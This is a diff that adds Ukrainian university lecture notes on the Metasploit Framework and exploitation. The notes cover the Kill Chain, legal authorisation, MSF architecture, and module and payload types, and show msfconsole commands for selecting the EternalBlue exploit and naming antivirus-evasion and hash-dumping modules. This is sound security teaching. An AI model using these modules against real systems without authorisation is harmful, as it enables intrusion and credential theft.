@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Конспект лекції 5: Фреймворк Metasploit та експлуатація — повний текст.">
-  <meta name="author" content="Кафедра інформатики та фізико-математичних дисциплін, УжНУ">
+  <meta name="description" content="Конспект лекції 5: Фреймворк Metasploit та експлуатація — повний текст. Metasploit Framework, експлойти, пейлоади, CVE, модулі, msfvenom, Meterpreter, класичні вразливості.">
+  <meta name="author" content="Кафедра ТЕІБ, УжНУ">
   <meta name="theme-color" content="#0ea5e9">
   <title>Конспект | Лекція 5. Фреймворк Metasploit та експлуатація</title>
   <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
@@ -69,18 +69,1794 @@
       <h1>Фреймворк Metasploit та експлуатація</h1>
       <div class="lecture-info">
         <span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
-        <span class="badge badge-locked">Скоро</span>
+        <span class="badge badge-new">Нова</span>
       </div>
 
+      <!-- ============================================================ -->
+      <!-- 5.1 Вступ до експлуатації вразливостей                       -->
+      <!-- ============================================================ -->
       <section>
-        <p>Матеріали цього конспекту готуються. Слідкуйте за оновленнями.</p>
+        <h2>5.1 Вступ до експлуатації вразливостей</h2>
+
+        <p>У попередніх лекціях ми розглянули <strong>розвідку</strong> (OSINT) та <strong>сканування мережі</strong> (Nmap, enumeration). Тепер ми переходимо до наступного критичного етапу — <strong>експлуатації вразливостей</strong>. Саме на цьому етапі пентестер перетворює зібрану інформацію про відкриті порти, сервіси та їх версії на реальний доступ до цільової системи.</p>
+
+        <p><strong>Експлуатація</strong> (exploitation) — це процес використання вразливості (vulnerability) у програмному забезпеченні, конфігурації або протоколі для виконання несанкціонованих дій: отримання доступу, підвищення привілеїв, викрадення даних або порушення роботи системи.</p>
+
+        <h3>Вразливість, експлойт та експлуатація</h3>
+        <p>Ці три терміни часто плутають, але вони мають чітко різні значення:</p>
+        <table>
+          <tr>
+            <th>Термін</th>
+            <th>Визначення</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><strong>Вразливість (Vulnerability)</strong></td>
+            <td>Слабке місце у системі — помилка в коді, некоректна конфігурація або недолік протоколу</td>
+            <td>Buffer overflow у SMBv1 (CVE-2017-0144)</td>
+          </tr>
+          <tr>
+            <td><strong>Експлойт (Exploit)</strong></td>
+            <td>Програмний код або послідовність дій, що використовує вразливість</td>
+            <td>EternalBlue — експлойт для CVE-2017-0144</td>
+          </tr>
+          <tr>
+            <td><strong>Експлуатація (Exploitation)</strong></td>
+            <td>Процес застосування експлойту для досягнення мети (доступ, RCE, DoS)</td>
+            <td>Запуск EternalBlue через Metasploit для отримання Meterpreter-сесії</td>
+          </tr>
+        </table>
+
+        <h3>Cyber Kill Chain (Lockheed Martin, 2011)</h3>
+        <p>Модель <strong>Cyber Kill Chain</strong>, розроблена Lockheed Martin у 2011 році, описує 7 фаз кібератаки. Експлуатація є четвертою фазою — без неї атакуючий не може отримати доступ до системи:</p>
+        <table>
+          <tr>
+            <th>#</th>
+            <th>Фаза Kill Chain</th>
+            <th>Опис</th>
+            <th>Еквівалент у пентесті</th>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td><strong>Reconnaissance</strong></td>
+            <td>Збір інформації про ціль</td>
+            <td>OSINT, Google Dorks, Shodan (Лекція 3)</td>
+          </tr>
+          <tr>
+            <td>2</td>
+            <td><strong>Weaponization</strong></td>
+            <td>Створення зброї: малвар + експлойт</td>
+            <td>msfvenom, генерація payload</td>
+          </tr>
+          <tr>
+            <td>3</td>
+            <td><strong>Delivery</strong></td>
+            <td>Доставка до цілі (email, USB, web)</td>
+            <td>Фішинг, соціальна інженерія, web exploit</td>
+          </tr>
+          <tr>
+            <td>4</td>
+            <td><strong>Exploitation</strong></td>
+            <td>Спрацювання експлойту на цільовій системі</td>
+            <td>Metasploit exploit, ручна експлуатація</td>
+          </tr>
+          <tr>
+            <td>5</td>
+            <td><strong>Installation</strong></td>
+            <td>Встановлення бекдору / persistence</td>
+            <td>Meterpreter, web shell, cron job</td>
+          </tr>
+          <tr>
+            <td>6</td>
+            <td><strong>Command &amp; Control</strong></td>
+            <td>Канал зв'язку з атакуючим</td>
+            <td>Reverse shell, C2 framework</td>
+          </tr>
+          <tr>
+            <td>7</td>
+            <td><strong>Actions on Objectives</strong></td>
+            <td>Досягнення мети: крадіжка, знищення</td>
+            <td>Exfiltration, pivoting, lateral movement</td>
+          </tr>
+        </table>
+
+        <h3>Фази PTES з фокусом на експлуатацію</h3>
+        <p>Згідно зі стандартом <strong>PTES</strong> (Penetration Testing Execution Standard), експлуатація є п'ятою фазою:</p>
+        <ol>
+          <li>Pre-engagement Interactions — домовленості та scope</li>
+          <li>Intelligence Gathering — пасивна розвідка (Лекція 3)</li>
+          <li>Threat Modeling — моделювання загроз</li>
+          <li>Vulnerability Analysis — сканування та enumeration (Лекція 4)</li>
+          <li><strong>Exploitation — експлуатація вразливостей (ця лекція)</strong></li>
+          <li>Post-Exploitation — дії після отримання доступу (Лекція 9)</li>
+          <li>Reporting — звітування (Лекція 12)</li>
+        </ol>
+
+        <h3>Типи експлойтів</h3>
+        <table>
+          <tr>
+            <th>Тип</th>
+            <th>Опис</th>
+            <th>Вектор атаки</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><strong>Remote (мережевий)</strong></td>
+            <td>Атака на мережевий сервіс без попереднього доступу</td>
+            <td>Відкритий порт з вразливим сервісом</td>
+            <td>EternalBlue (SMB), Log4Shell (HTTP)</td>
+          </tr>
+          <tr>
+            <td><strong>Local (локальний)</strong></td>
+            <td>Підвищення привілеїв при наявності обмеженого доступу</td>
+            <td>Вразливість у ядрі або SUID-бінарнику</td>
+            <td>DirtyPipe (CVE-2022-0847), DirtyCow</td>
+          </tr>
+          <tr>
+            <td><strong>Client-side</strong></td>
+            <td>Атака на клієнтський додаток (браузер, PDF, Office)</td>
+            <td>Користувач відкриває шкідливий файл або URL</td>
+            <td>Browser exploit kit, шкідливий PDF</td>
+          </tr>
+          <tr>
+            <td><strong>Web Application</strong></td>
+            <td>Атака на веб-додаток через HTTP</td>
+            <td>Ін'єкція у параметри запиту</td>
+            <td>SQL Injection, RCE через deserialization</td>
+          </tr>
+          <tr>
+            <td><strong>Denial of Service (DoS)</strong></td>
+            <td>Порушення доступності сервісу</td>
+            <td>Переповнення буферу без виконання коду</td>
+            <td>SlowLoris, SYN Flood, Ping of Death</td>
+          </tr>
+          <tr>
+            <td><strong>Privilege Escalation</strong></td>
+            <td>Підвищення привілеїв від user до root/SYSTEM</td>
+            <td>Misconfiguration, kernel exploit</td>
+            <td>PrintNightmare (CVE-2021-34527)</td>
+          </tr>
+        </table>
+
+        <h3>Zero-day vs N-day</h3>
+        <ul>
+          <li><strong>Zero-day (0-day)</strong> — вразливість, для якої ще не існує офіційного патча. Назва означає «нуль днів з моменту публікації патча». Такі вразливості найцінніші: ціна на чорному ринку — від $50,000 до $2,500,000 (Zerodium, 2024). Приклади: Stuxnet використовував 4 zero-day; Pegasus (NSO Group) — ланцюжок zero-day для iOS.</li>
+          <li><strong>N-day</strong> — вразливість, для якої патч існує N днів, але ціль його ще не встановила. Більшість реальних зламів використовують саме N-day: патч вже доступний, але адміністратори зволікають з оновленням. За даними Mandiant (2024), середній час від публікації CVE до масової експлуатації — <strong>5 днів</strong>.</li>
+        </ul>
+
+        <h3>Правовий та етичний фреймворк</h3>
+        <p>Експлуатація вразливостей — це найбільш юридично ризикований етап пентесту. Обов'язкові вимоги:</p>
+        <ul>
+          <li><strong>Письмовий дозвіл (Rules of Engagement)</strong> — підписаний документ із чітким scope: IP-адреси, домени, порти, дозволені методи та часові рамки</li>
+          <li><strong>Scope limitations</strong> — ніколи не виходити за межі авторизованого scope. Навіть випадковий pivot на чужу систему може мати юридичні наслідки</li>
+          <li><strong>Computer Fraud and Abuse Act (CFAA, США)</strong> — федеральний закон, що криміналізує несанкціонований доступ до комп'ютерних систем (до 20 років ув'язнення)</li>
+          <li><strong>EU Directive 2013/40/EU</strong> — директива ЄС про атаки на інформаційні системи: криміналізує незаконний доступ, перехоплення, втручання</li>
+          <li><strong>Кримінальний кодекс України, ст. 361-363</strong> — несанкціоноване втручання в роботу ЕОМ, створення та розповсюдження шкідливих програм</li>
+          <li><strong>Get-Out-of-Jail Letter</strong> — документ від замовника, що підтверджує авторизацію тестування. Пентестер має мати його при собі під час фізичних тестів</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 5.2 Архітектура Metasploit Framework                         -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>5.2 Архітектура Metasploit Framework</h2>
+
+        <p><strong>Metasploit Framework (MSF)</strong> — це найпопулярніша у світі платформа для тестування на проникнення та розробки експлойтів. Це відкритий (open-source) проєкт, що надає інфраструктуру для написання, тестування та використання exploit-коду. Metasploit перетворив процес експлуатації з рутинного ручного кодування на структуровану, модульну систему.</p>
+
+        <h3>Хронологія розвитку</h3>
+        <table>
+          <tr>
+            <th>Рік</th>
+            <th>Подія</th>
+            <th>Деталі</th>
+          </tr>
+          <tr>
+            <td><strong>2003</strong></td>
+            <td>Створення MSF 1.0</td>
+            <td>HD Moore (H.D. Moore), написано на Perl, 11 експлойтів</td>
+          </tr>
+          <tr>
+            <td><strong>2004</strong></td>
+            <td>MSF 2.0</td>
+            <td>Повне переписування, модульна архітектура</td>
+          </tr>
+          <tr>
+            <td><strong>2007</strong></td>
+            <td>MSF 3.0</td>
+            <td>Переписано на Ruby, 177 експлойтів, 104 payload'и</td>
+          </tr>
+          <tr>
+            <td><strong>2009</strong></td>
+            <td>Придбання Rapid7</td>
+            <td>Rapid7 купує проєкт, HD Moore продовжує розробку</td>
+          </tr>
+          <tr>
+            <td><strong>2011</strong></td>
+            <td>MSF 4.0</td>
+            <td>Metasploit Pro, GUI, веб-інтерфейс</td>
+          </tr>
+          <tr>
+            <td><strong>2019</strong></td>
+            <td>MSF 5.0</td>
+            <td>Нові бази даних, evasion-модулі, метадані, JSON RPC</td>
+          </tr>
+          <tr>
+            <td><strong>2020</strong></td>
+            <td>MSF 6.0</td>
+            <td>Шифрування сесій, SMBv3 клієнт, покращення продуктивності</td>
+          </tr>
+          <tr>
+            <td><strong>2024</strong></td>
+            <td>MSF 6.4</td>
+            <td>2300+ експлойтів, ARM64 Meterpreter, indirect syscalls</td>
+          </tr>
+          <tr>
+            <td><strong>2025</strong></td>
+            <td>MSF 6.4.x (поточна)</td>
+            <td>139 нових модулів за 2024 рік, SMB-to-LDAP relay, нові типи сесій</td>
+          </tr>
+        </table>
+
+        <h3>Архітектура системи</h3>
+        <p>Metasploit побудований на багаторівневій архітектурі, де кожен рівень надає абстракцію для рівня вище:</p>
+
+        <pre><code>┌─────────────────────────────────────────────────────────┐
+│                    ІНТЕРФЕЙСИ                           │
+│   msfconsole │ Armitage │ msfd │ MSF Web │ RPC API      │
+├─────────────────────────────────────────────────────────┤
+│                    МОДУЛІ                               │
+│  Exploits│Auxiliary│Post│Payloads│Encoders│NOPs│Evasion  │
+├─────────────────────────────────────────────────────────┤
+│                   ПЛАГІНИ                               │
+│          db_tracker │ pcap_log │ wmap │ nexpose          │
+├─────────────────────────────────────────────────────────┤
+│                   MSF BASE                              │
+│          Спрощений API для модулів та плагінів           │
+├─────────────────────────────────────────────────────────┤
+│                   MSF CORE                              │
+│   Module Manager │ Session Manager │ Event Dispatcher    │
+│   DataStore │ Plugin Manager │ Framework Instance        │
+├─────────────────────────────────────────────────────────┤
+│                  REX LIBRARY                            │
+│   Sockets │ Protocols │ Transformations │ Logging        │
+│   SSL │ SMB │ HTTP │ Encoding │ Assembly │ Text          │
+└─────────────────────────────────────────────────────────┘</code></pre>
+
+        <h3>Rex Library (Ruby Extension Library)</h3>
+        <p>Фундаментальний рівень, що надає базові компоненти:</p>
+        <ul>
+          <li><strong>Сокети</strong> — TCP, UDP, SSL/TLS клієнти та сервери</li>
+          <li><strong>Протоколи</strong> — реалізації SMB, HTTP, SSH, FTP, DCERPC, NTLM та інших</li>
+          <li><strong>Кодування</strong> — Base64, XOR, Unicode, та інші трансформації</li>
+          <li><strong>Асемблер</strong> — генерація шелл-коду для x86, x64, ARM</li>
+          <li><strong>Текст</strong> — рандомізація, обфускація, форматування</li>
+        </ul>
+
+        <h3>MSF Core</h3>
+        <p>Ядро фреймворку, що забезпечує базову функціональність:</p>
+        <ul>
+          <li><strong>Module Manager</strong> — завантаження, пошук та управління модулями</li>
+          <li><strong>Session Manager</strong> — відстеження та управління активними сесіями (shell, Meterpreter)</li>
+          <li><strong>Event Dispatcher</strong> — система подій для інтеграції компонентів</li>
+          <li><strong>DataStore</strong> — глобальне та локальне сховище параметрів (RHOSTS, LHOST, PAYLOAD тощо)</li>
+          <li><strong>Plugin Manager</strong> — динамічне завантаження плагінів</li>
+        </ul>
+
+        <h3>MSF Base</h3>
+        <p>Спрощений API-рівень, що обгортає MSF Core та надає зручні методи для розробників модулів. Містить mixins — модулі Ruby, що додають функціональність: <code>Msf::Exploit::Remote::Tcp</code>, <code>Msf::Exploit::Remote::HttpClient</code>, <code>Msf::Auxiliary::Scanner</code> тощо.</p>
+
+        <h3>Структура директорій</h3>
+        <p>Типова інсталяція в Kali Linux (<code>/usr/share/metasploit-framework/</code>):</p>
+        <pre><code>/usr/share/metasploit-framework/
+├── modules/                    # Усі модулі
+│   ├── exploits/               # Експлойти (~2300)
+│   │   ├── windows/            # Windows-експлойти
+│   │   ├── linux/              # Linux-експлойти
+│   │   ├── multi/              # Кросплатформні
+│   │   └── ...
+│   ├── auxiliary/               # Допоміжні модулі (~1200)
+│   ├── post/                    # Пост-експлуатаційні (~400)
+│   ├── payloads/                # Пейлоади (~590)
+│   │   ├── singles/             # Самостійні
+│   │   ├── stagers/             # Стейджери
+│   │   └── stages/              # Стейджі
+│   ├── encoders/                # Кодувальники (~45)
+│   ├── nops/                    # NOP-генератори (~11)
+│   └── evasion/                 # Модулі обходу (~9)
+├── lib/                         # Бібліотеки Ruby (Rex, MSF Core/Base)
+├── data/                        # Дані: wordlists, шаблони, John rules
+│   ├── exploits/                # Файли для конкретних експлойтів
+│   ├── wordlists/               # Списки паролів
+│   └── templates/               # Шаблони EXE, DLL, ELF
+├── tools/                       # Утиліти: pattern_create, nasm_shell
+├── scripts/                     # Скрипти для Meterpreter та resource
+├── plugins/                     # Плагіни фреймворку
+└── documentation/               # Документація</code></pre>
+
+        <h3>База даних PostgreSQL</h3>
+        <p>Metasploit використовує PostgreSQL для зберігання результатів сканувань, сесій, облікових даних та loot:</p>
+        <pre><code># Ініціалізація бази даних (Kali Linux)
+sudo msfdb init
+
+# Перевірка стану
+msf6 &gt; db_status
+[*] Connected to msf. Connection type: postgresql.
+
+# Робота з workspace
+msf6 &gt; workspace                     # Показати поточний
+msf6 &gt; workspace -a pentest_client   # Створити новий
+msf6 &gt; workspace pentest_client      # Перемкнутись
+msf6 &gt; workspace -d old_workspace    # Видалити</code></pre>
+
+        <h3>Видання Metasploit</h3>
+        <table>
+          <tr>
+            <th>Видання</th>
+            <th>Ціна</th>
+            <th>Інтерфейс</th>
+            <th>Ключові можливості</th>
+          </tr>
+          <tr>
+            <td><strong>Framework</strong></td>
+            <td>Безкоштовно (BSD)</td>
+            <td>CLI (msfconsole)</td>
+            <td>Повний набір модулів, скриптів, API. Основа для Kali Linux</td>
+          </tr>
+          <tr>
+            <td><strong>Community</strong></td>
+            <td>Безкоштовно</td>
+            <td>Web GUI (обмежений)</td>
+            <td>Базовий сканер, інтеграція з Nexpose, обмежена автоматизація</td>
+          </tr>
+          <tr>
+            <td><strong>Pro</strong></td>
+            <td>~$15,000/рік</td>
+            <td>Web GUI (повний)</td>
+            <td>Автоматизація, звіти, соціальна інженерія, VPN pivoting, колаборація команди</td>
+          </tr>
+        </table>
+
+        <h3>Інтерфейси</h3>
+        <table>
+          <tr>
+            <th>Інтерфейс</th>
+            <th>Тип</th>
+            <th>Статус</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>msfconsole</strong></td>
+            <td>CLI (інтерактивний)</td>
+            <td>Основний, активний</td>
+            <td>Повнофункціональна інтерактивна консоль. Підтримує табуляцію, історію, скрипти</td>
+          </tr>
+          <tr>
+            <td><strong>Armitage</strong></td>
+            <td>Java GUI</td>
+            <td>Стабільний, рідко оновлюється</td>
+            <td>Графічний інтерфейс для командної роботи. Візуалізація мережі, drag-and-drop</td>
+          </tr>
+          <tr>
+            <td><strong>msfd</strong></td>
+            <td>Daemon</td>
+            <td>Активний</td>
+            <td>Сервер msfconsole — можливість підключення через netcat/telnet</td>
+          </tr>
+          <tr>
+            <td><strong>MSF Web</strong></td>
+            <td>Web GUI</td>
+            <td>Тільки Pro</td>
+            <td>Повний веб-інтерфейс з дашбордами та звітами</td>
+          </tr>
+          <tr>
+            <td><strong>RPC API</strong></td>
+            <td>API</td>
+            <td>Активний</td>
+            <td>MessagePack RPC для автоматизації та інтеграції (порт 55553)</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 5.3 Модулі Metasploit                                        -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>5.3 Модулі Metasploit</h2>
+
+        <p>Модулі — це будівельні блоки Metasploit. Кожен модуль — це окремий Ruby-скрипт, що виконує конкретне завдання. Модульна архітектура дозволяє легко додавати нову функціональність та комбінувати компоненти.</p>
+
+        <h3>Типи модулів</h3>
+        <table>
+          <tr>
+            <th>Тип</th>
+            <th>Кількість (2025)</th>
+            <th>Призначення</th>
+            <th>Результат</th>
+          </tr>
+          <tr>
+            <td><strong>Exploits</strong></td>
+            <td>2300+</td>
+            <td>Використання вразливостей для виконання payload</td>
+            <td>Сесія (shell, Meterpreter)</td>
+          </tr>
+          <tr>
+            <td><strong>Auxiliary</strong></td>
+            <td>1200+</td>
+            <td>Сканування, фузинг, спуфінг, DoS, збір інформації</td>
+            <td>Інформація, перевірка вразливості</td>
+          </tr>
+          <tr>
+            <td><strong>Post</strong></td>
+            <td>400+</td>
+            <td>Дії після отримання доступу</td>
+            <td>Дані, привілеї, persistence</td>
+          </tr>
+          <tr>
+            <td><strong>Payloads</strong></td>
+            <td>590+</td>
+            <td>Код, що виконується на цільовій системі</td>
+            <td>Shell, Meterpreter, команда</td>
+          </tr>
+          <tr>
+            <td><strong>Encoders</strong></td>
+            <td>45+</td>
+            <td>Обфускація payload для обходу антивірусів</td>
+            <td>Закодований payload</td>
+          </tr>
+          <tr>
+            <td><strong>NOPs</strong></td>
+            <td>11+</td>
+            <td>Генерація NOP-слайдів для вирівнювання</td>
+            <td>NOP-послідовність</td>
+          </tr>
+          <tr>
+            <td><strong>Evasion</strong></td>
+            <td>9+</td>
+            <td>Генерація файлів, що обходять антивіруси</td>
+            <td>Файл (EXE, MSI), що минає AV</td>
+          </tr>
+        </table>
+
+        <h3>Exploits — детально</h3>
+        <p>Експлойти класифікуються за платформою та типом:</p>
+        <table>
+          <tr>
+            <th>Підтип</th>
+            <th>Опис</th>
+            <th>Приклад модуля</th>
+          </tr>
+          <tr>
+            <td><strong>Remote</strong></td>
+            <td>Мережевий експлойт проти відкритого сервісу</td>
+            <td><code>exploit/windows/smb/ms17_010_eternalblue</code></td>
+          </tr>
+          <tr>
+            <td><strong>Local</strong></td>
+            <td>Підвищення привілеїв на вже скомпрометованій системі</td>
+            <td><code>exploit/linux/local/cve_2022_0847_dirtypipe</code></td>
+          </tr>
+          <tr>
+            <td><strong>Client-side</strong></td>
+            <td>Жертва відкриває шкідливий файл або URL</td>
+            <td><code>exploit/windows/browser/ms14_064_ole_code_execution</code></td>
+          </tr>
+          <tr>
+            <td><strong>Web App</strong></td>
+            <td>Атака на веб-додаток</td>
+            <td><code>exploit/multi/http/apache_struts2_content_type_ognl</code></td>
+          </tr>
+        </table>
+
+        <h3>Auxiliary — детально</h3>
+        <table>
+          <tr>
+            <th>Підтип</th>
+            <th>Опис</th>
+            <th>Приклад модуля</th>
+          </tr>
+          <tr>
+            <td><strong>Scanner</strong></td>
+            <td>Сканування мережі та сервісів</td>
+            <td><code>auxiliary/scanner/smb/smb_ms17_010</code></td>
+          </tr>
+          <tr>
+            <td><strong>Fuzzer</strong></td>
+            <td>Надсилання випадкових даних для пошуку багів</td>
+            <td><code>auxiliary/fuzzers/http/http_form_field</code></td>
+          </tr>
+          <tr>
+            <td><strong>DoS</strong></td>
+            <td>Denial of Service перевірки</td>
+            <td><code>auxiliary/dos/tcp/synflood</code></td>
+          </tr>
+          <tr>
+            <td><strong>Admin</strong></td>
+            <td>Адміністративні дії на сервісах</td>
+            <td><code>auxiliary/admin/smb/samba_symlink_traversal</code></td>
+          </tr>
+          <tr>
+            <td><strong>Gather</strong></td>
+            <td>Збір інформації без експлуатації</td>
+            <td><code>auxiliary/gather/dns_bruteforce</code></td>
+          </tr>
+          <tr>
+            <td><strong>Server</strong></td>
+            <td>Підняття серверів для атак (SMB, HTTP, DNS)</td>
+            <td><code>auxiliary/server/capture/smb</code></td>
+          </tr>
+        </table>
+
+        <h3>Post-exploitation модулі</h3>
+        <p>Запускаються після отримання сесії для збору даних та закріплення:</p>
+        <ul>
+          <li><code>post/windows/gather/hashdump</code> — дамп хешів паролів із SAM</li>
+          <li><code>post/multi/recon/local_exploit_suggester</code> — пошук локальних експлойтів для privilege escalation</li>
+          <li><code>post/windows/manage/migrate</code> — міграція Meterpreter у інший процес</li>
+          <li><code>post/windows/gather/enum_domain</code> — перелічення домену Active Directory</li>
+          <li><code>post/linux/gather/enum_configs</code> — збір конфігурацій Linux-системи</li>
+          <li><code>post/multi/manage/shell_to_meterpreter</code> — апгрейд shell до Meterpreter</li>
+        </ul>
+
+        <h3>Encoders</h3>
+        <p>Кодувальники обфускують payload для обходу сигнатурного аналізу антивірусів та виключення «поганих байтів» (bad characters):</p>
+        <ul>
+          <li><code>x86/shikata_ga_nai</code> — поліморфний XOR-кодувальник, найпопулярніший. Генерує унікальний декодер при кожному запуску</li>
+          <li><code>x86/fnstenv_mov</code> — використовує FPU-інструкції для визначення адреси</li>
+          <li><code>cmd/powershell_base64</code> — Base64-кодування для PowerShell</li>
+          <li><code>php/base64</code> — Base64-кодування для PHP payload</li>
+        </ul>
+        <p><strong>Увага:</strong> сучасні антивіруси (2024-2025) використовують поведінковий аналіз та машинне навчання. Самі по собі encoder'и більше <strong>не є достатніми</strong> для обходу антивірусів — вони корисні переважно для виключення bad characters та базової обфускації.</p>
+
+        <h3>NOP-генератори та Evasion-модулі</h3>
+        <p><strong>NOP-генератори</strong> створюють послідовності інструкцій «No Operation» для вирівнювання payload у пам'яті при buffer overflow-атаках. <strong>NOP-слайд</strong> збільшує ймовірність потрапити на початок shellcode.</p>
+        <p><strong>Evasion-модулі</strong> (додані у MSF 5.0) генерують виконувані файли, що обходять конкретні антивірусні рішення:</p>
+        <ul>
+          <li><code>evasion/windows/windows_defender_exe</code> — обхід Windows Defender</li>
+          <li><code>evasion/windows/windows_defender_js_hta</code> — обхід через HTA-файл</li>
+        </ul>
+
+        <h3>Конвенція іменування модулів</h3>
+        <p>Кожен модуль має шлях, що відображає його тип, платформу, сервіс та назву:</p>
+        <pre><code># Формат: тип/платформа/сервіс/назва
+exploit/windows/smb/ms17_010_eternalblue
+│       │       │   └── назва (CVE або опис)
+│       │       └── сервіс (smb)
+│       └── платформа (windows)
+└── тип (exploit)
+
+# Інші приклади:
+auxiliary/scanner/portscan/tcp
+post/windows/gather/hashdump
+payload/windows/meterpreter/reverse_tcp
+encoder/x86/shikata_ga_nai
+nop/x86/opty2</code></pre>
+
+        <h3>Пошук модулів</h3>
+        <pre><code># Пошук за ключовим словом
+msf6 &gt; search eternalblue
+
+# Пошук за CVE
+msf6 &gt; search cve:2017-0144
+
+# Пошук за типом
+msf6 &gt; search type:exploit platform:windows smb
+
+# Пошук за платформою та рангом
+msf6 &gt; search platform:linux rank:excellent
+
+# Пошук за автором
+msf6 &gt; search author:hdm
+
+# Пошук за шляхом
+msf6 &gt; search path:smb
+
+# Комбінований пошук
+msf6 &gt; search type:exploit name:apache cve:2021 rank:great</code></pre>
+
+        <h3>Робота з модулем</h3>
+        <pre><code># Вибрати модуль
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+
+# Переглянути параметри
+msf6 exploit(ms17_010_eternalblue) &gt; show options
+
+# Переглянути доступні пейлоади
+msf6 exploit(ms17_010_eternalblue) &gt; show payloads
+
+# Переглянути цілі (targets)
+msf6 exploit(ms17_010_eternalblue) &gt; show targets
+
+# Повна інформація про модуль
+msf6 exploit(ms17_010_eternalblue) &gt; info
+
+# Повернутись назад
+msf6 exploit(ms17_010_eternalblue) &gt; back</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 5.4 Пейлоади та шелл-коди                                    -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>5.4 Пейлоади та шелл-коди</h2>
+
+        <p><strong>Payload</strong> (пейлоад, корисне навантаження) — це код, який виконується на цільовій системі після успішної експлуатації вразливості. Якщо експлойт — це «ключ», що відкриває двері, то payload — це «людина», що входить у двері та виконує завдання.</p>
+
+        <h3>Три категорії пейлоадів</h3>
+        <table>
+          <tr>
+            <th>Категорія</th>
+            <th>Опис</th>
+            <th>Розмір</th>
+            <th>Нейминг</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><strong>Singles (Inline)</strong></td>
+            <td>Самостійний payload, що містить весь код. Не потребує додаткового завантаження</td>
+            <td>Більший</td>
+            <td>Символ <code>_</code> (підкреслення)</td>
+            <td><code>windows/shell_reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Stagers</strong></td>
+            <td>Маленький код, що встановлює мережевий канал та завантажує Stage</td>
+            <td>Мінімальний (~350 байт)</td>
+            <td>Символ <code>/</code> (слеш)</td>
+            <td><code>windows/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Stages</strong></td>
+            <td>Повнофункціональний payload, завантажений Stager'ом (Meterpreter, VNC inject тощо)</td>
+            <td>Великий (до МБ)</td>
+            <td>Частина після <code>/</code></td>
+            <td><code>meterpreter</code> у <code>windows/meterpreter/reverse_tcp</code></td>
+          </tr>
+        </table>
+
+        <p><strong>Ключова різниця у назві:</strong></p>
+        <pre><code># Staged payload (stager + stage) — символ /
+windows/meterpreter/reverse_tcp
+         │           │
+         stage       stager
+
+# Stageless payload (inline/single) — символ _
+windows/meterpreter_reverse_tcp
+         │
+         усе в одному файлі</code></pre>
+
+        <h3>Staged vs Stageless</h3>
+        <table>
+          <tr>
+            <th>Характеристика</th>
+            <th>Staged (stager + stage)</th>
+            <th>Stageless (inline)</th>
+          </tr>
+          <tr>
+            <td><strong>Розмір початкового payload</strong></td>
+            <td>Малий (~350 байт для stager)</td>
+            <td>Великий (весь код одразу)</td>
+          </tr>
+          <tr>
+            <td><strong>Мережевий трафік</strong></td>
+            <td>Додаткове завантаження stage після з'єднання</td>
+            <td>Одноразова передача</td>
+          </tr>
+          <tr>
+            <td><strong>Виявлення AV</strong></td>
+            <td>Stager менш помітний; stage завантажується в пам'ять</td>
+            <td>Більше сигнатур у одному файлі</td>
+          </tr>
+          <tr>
+            <td><strong>Надійність</strong></td>
+            <td>Залежить від стабільного з'єднання для stage</td>
+            <td>Вищий — весь код вже на місці</td>
+          </tr>
+          <tr>
+            <td><strong>Обмеження буферу</strong></td>
+            <td>Підходить для малих буферів</td>
+            <td>Потребує більшого простору</td>
+          </tr>
+          <tr>
+            <td><strong>Використання</strong></td>
+            <td>Стандартний вибір у Metasploit</td>
+            <td>Нестабільні мережі, restricted environments</td>
+          </tr>
+        </table>
+
+        <h3>Bind Shell vs Reverse Shell</h3>
+        <table>
+          <tr>
+            <th>Характеристика</th>
+            <th>Bind Shell</th>
+            <th>Reverse Shell</th>
+          </tr>
+          <tr>
+            <td><strong>Напрямок з'єднання</strong></td>
+            <td>Ціль відкриває порт, атакуючий підключається</td>
+            <td>Ціль підключається до атакуючого</td>
+          </tr>
+          <tr>
+            <td><strong>Фаєрвол (вхідний)</strong></td>
+            <td>Блокує — порт на цілі закритий для вхідних</td>
+            <td>Пропускає — це вихідне з'єднання</td>
+          </tr>
+          <tr>
+            <td><strong>NAT</strong></td>
+            <td>Проблема — ціль за NAT недоступна</td>
+            <td>Працює — ціль ініціює з'єднання назовні</td>
+          </tr>
+          <tr>
+            <td><strong>Виявлення</strong></td>
+            <td>Незвичний відкритий порт на цілі</td>
+            <td>Вихідне з'єднання — менш підозріле</td>
+          </tr>
+          <tr>
+            <td><strong>Payload у Metasploit</strong></td>
+            <td><code>windows/meterpreter/bind_tcp</code></td>
+            <td><code>windows/meterpreter/reverse_tcp</code></td>
+          </tr>
+        </table>
+        <p><strong>Чому reverse shell переважає:</strong> більшість мережевих середовищ налаштовані блокувати <em>вхідні</em> з'єднання, але дозволяють <em>вихідні</em> (щоб користувачі могли відвідувати веб-сайти). Reverse shell використовує цю асиметрію. Крім того, NAT зазвичай перешкоджає bind shell, бо зовнішній атакуючий не може підключитися до внутрішньої IP-адреси.</p>
+
+        <h3>Meterpreter — Meta-Interpreter</h3>
+        <p><strong>Meterpreter</strong> — це найпотужніший payload у Metasploit. Це повнофункціональний агент, що працює виключно в оперативній пам'яті (in-memory), не залишаючи файлів на диску. Комунікація шифрується за допомогою AES-256 (з MSF 6.0).</p>
+
+        <p><strong>Ключові властивості Meterpreter:</strong></p>
+        <ul>
+          <li><strong>In-memory execution</strong> — працює в пам'яті процесу, не створює файлів на диску</li>
